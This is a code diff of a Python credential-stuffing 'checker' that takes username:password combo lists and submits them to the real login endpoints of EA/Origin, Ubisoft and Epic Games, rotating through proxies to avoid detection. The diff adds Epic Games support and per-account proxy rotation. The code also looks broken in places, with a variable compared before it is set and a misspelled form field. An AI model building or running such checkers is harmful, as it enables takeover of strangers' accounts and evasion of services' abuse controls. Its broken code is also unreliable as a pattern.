@@ -1,7 +1,7 @@
 import requests, urllib, sys, base64
 
 def Checker(combos, proxys):
-    urls = ["https://signin.ea.com/p/originX/login?initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Dde_DE%26client_id%3DORIGIN_SPA_ID", "https://public-ubiservices.ubi.com/v3/profiles/sessions"]
+    urls = ["https://signin.ea.com/p/originX/login?initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Dde_DE%26client_id%3DORIGIN_SPA_ID", "https://public-ubiservices.ubi.com/v3/profiles/sessions", "https://www.epicgames.com/id/api/login"]
 
     switcher = {
 
@@ -9,7 +9,6 @@ def Checker(combos, proxys):
             "UPlay":2,
             "Steam":3,
             "Spotify":4,
-            "GOG":5,
             "Netflix":6,
             "Hulu":7,
             "Epic Games":8,
@@ -28,7 +27,6 @@ def Checker(combos, proxys):
 
             Games:
             Steam,
-            GOG,
             Epic Games,
             Origin,
             UPlay
@@ -44,13 +42,8 @@ def Checker(combos, proxys):
     # 401 = Invalid Login
 
     r = combos
-    prx = []
-    i = 0
-    for proxy in proxys:
-        i += 1
-        prx.append(i)
-    print(prx)
     if a == 1:
+        o = 0
         for account in r:
             account = account.replace("\n", "")
             a = account.split(":")
@@ -62,11 +55,12 @@ def Checker(combos, proxys):
                     "password": pwd
                     }
             with requests.Session() as s1:
-                p = s1.post(urls[0], data=payload, proxies=proxy)
-
+                p = s1.post(urls[0], data=payload, proxies=proxys[o])
+            o += 1
 
 
     if a == 2:
+        o = 0
         for account in r:
             account = account.replace("\n", "")
             token = base64.b64encode(bytes(account, "utf-8"))
@@ -85,10 +79,23 @@ def Checker(combos, proxys):
                         "Authorization": token,
                         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
                         'Ubi-RequestedPlatformType':'uplay',
-                        }, proxies=proxy)
+                        }, proxies=proxys[o])
                 print(account)
-                
-        
+                print(p.status_code)
+            o += 1
+    
+    if a == 8:
+        o = 0
+        for account in r:
+            account = account.replace("\n", "")
+            a = account.split(":")
+            user = a[0]
+            pwd = a[1]
+            payload = {
+                    "login[username]": user,
+                    "login[pasword]": pwd
+                    }
+            with requests.Session() as s2:
+                p = s2.post(urls[2], data=payload)
+                print(p)
 
-    # POST
-    # https://public-s
